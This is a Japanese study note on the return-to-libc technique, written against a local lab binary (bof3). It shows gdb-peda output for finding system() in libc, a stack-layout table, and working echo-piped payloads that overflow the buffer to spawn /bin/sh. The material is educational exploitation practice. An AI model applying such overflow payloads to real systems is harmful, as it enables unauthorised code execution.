# Return to libc(ret2libc)

## 前提
ここで書かれた内容を悪用してはいけません. あくまで攻撃手法の知識共有として残します.

## 本題
解析したソースコードはret2pltと同じ.

```
 gdb -q bof3
Reading symbols from bof3...(no debugging symbols found)...done.
gdb-peda$ b main
Breakpoint 1 at 0x80484a0
gdb-peda$ r
Starting program: /home/vagrant/pwn/book4b_pwn/step4/stack-bof/bof3/bof3
[----------------------------------registers-----------------------------------]
EAX: 0xf7fbadd8 --> 0xffffd34c --> 0xffffd4bb ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
EBX: 0x0
ECX: 0xe773d938
EDX: 0xffffd2d4 --> 0x0
ESI: 0xf7fb9000 --> 0x1d7d6c
EDI: 0x0
EBP: 0xffffd2a8 --> 0x0
ESP: 0xffffd2a8 --> 0x0
EIP: 0x80484a0 (<main+3>:	and    esp,0xfffffff0)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048498 <frame_dummy+40>:	jmp    0x8048410 <register_tm_clones>
   0x804849d <main>:	push   ebp
   0x804849e <main+1>:	mov    ebp,esp
=> 0x80484a0 <main+3>:	and    esp,0xfffffff0
   0x80484a3 <main+6>:	sub    esp,0x30
   0x80484a6 <main+9>:	mov    DWORD PTR [esp+0x4],0x804a060
   0x80484ae <main+17>:	mov    DWORD PTR [esp],0x8048590
   0x80484b5 <main+24>:	call   0x8048350 <printf@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffd2a8 --> 0x0
0004| 0xffffd2ac --> 0xf7df9e81 (<__libc_start_main+241>:	add    esp,0x10)
0008| 0xffffd2b0 --> 0x1
0012| 0xffffd2b4 --> 0xffffd344 --> 0xffffd484 ("/home/vagrant/pwn/book4b_pwn/step4/stack-bof/bof3/bof3")
0016| 0xffffd2b8 --> 0xffffd34c --> 0xffffd4bb ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
0020| 0xffffd2bc --> 0xffffd2d4 --> 0x0
0024| 0xffffd2c0 --> 0x1
0028| 0xffffd2c4 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080484a0 in main ()
gdb-peda$ vmmap
Start      End        Perm	Name
0x08048000 0x08049000 r-xp	/home/vagrant/pwn/book4b_pwn/step4/stack-bof/bof3/bof3
0x08049000 0x0804a000 r--p	/home/vagrant/pwn/book4b_pwn/step4/stack-bof/bof3/bof3
0x0804a000 0x0804b000 rw-p	/home/vagrant/pwn/book4b_pwn/step4/stack-bof/bof3/bof3
0xf7de1000 0xf7fb6000 r-xp	/lib/i386-linux-gnu/libc-2.27.so
0xf7fb6000 0xf7fb7000 ---p	/lib/i386-linux-gnu/libc-2.27.so
0xf7fb7000 0xf7fb9000 r--p	/lib/i386-linux-gnu/libc-2.27.so
0xf7fb9000 0xf7fba000 rw-p	/lib/i386-linux-gnu/libc-2.27.so
0xf7fba000 0xf7fbd000 rw-p	mapped
0xf7fcf000 0xf7fd1000 rw-p	mapped
0xf7fd1000 0xf7fd4000 r--p	[vvar]
0xf7fd4000 0xf7fd6000 r-xp	[vdso]
0xf7fd6000 0xf7ffc000 r-xp	/lib/i386-linux-gnu/ld-2.27.so
0xf7ffc000 0xf7ffd000 r--p	/lib/i386-linux-gnu/ld-2.27.so
0xf7ffd000 0xf7ffe000 rw-p	/lib/i386-linux-gnu/ld-2.27.so
0xfffdd000 0xffffe000 rw-p	[stack]
gdb-peda$ print system
$4 = {<text variable, no debug info>} 0xf7e1e200 <system>
```
`system`関数は`0xf7e1e200`に存在し, `0xf7de1000 0xf7fb6000 r-xp	/lib/i386-linux-gnu/libc-2.27.so`の領域にあることが分かります.

| | |
| --- | --- |
| 下位アドレス(0x00000000) | |
| ↓ | |
|関数アドレス(=リターンアドレス) | 0xf7e1e200 (system) |
|prinf呼び出し後のリターンアドレス(`saved_ebp`) | 0x42424242(ダミー) |
|引数1 | 0x0804a060(buffer変数) |
| ↓ | |
|上位アドレス(0xffffffff) | |

buffer変数には入力した文字列がコピーされるが, うまくsystem関数でコマンドとして実行できるような文字列である必要がある.
方針としては

1. system関数が受け取る文字列はNULLバイトで終端されていなければならない事を利用し, コマンド文字列の直後にNULLを挿入する
2. systemがシェルのコマンドとして実行されるのを利用して、不要な文字列をコメントアウトする.

2つある.

buffer変数の中身とlibcのアドレスを利用して`/bin/sh`を実行する攻撃文字列を実行した例が以下の通り.
```
$ (echo -e '/bin/sh\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\xe2\xe1\xf7BBBB\x60\xa0\x04\x08'; cat)| ./bof3
buffer: 0x804a060
ls
 bof3   bof3.c	 peda-session-bof3.txt	's main'
exit

Segmentation fault (core dumped)
vagrant@bof3$ (echo -e '/bin/sh #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\xe2\xe1\xf7BBBB\x60\xa0\x04\x08'; cat)| ./bof3
buffer: 0x804a060
ls
 bof3   bof3.c	 peda-session-bof3.txt	's main'

exit
```

`(echo -e '...'; cat) | ./bof3`として実行しているが、これは
**echoで指定した文字列を出力した後は, catを実行し標準入力から入力された物をbof3にパイプする**という意味である.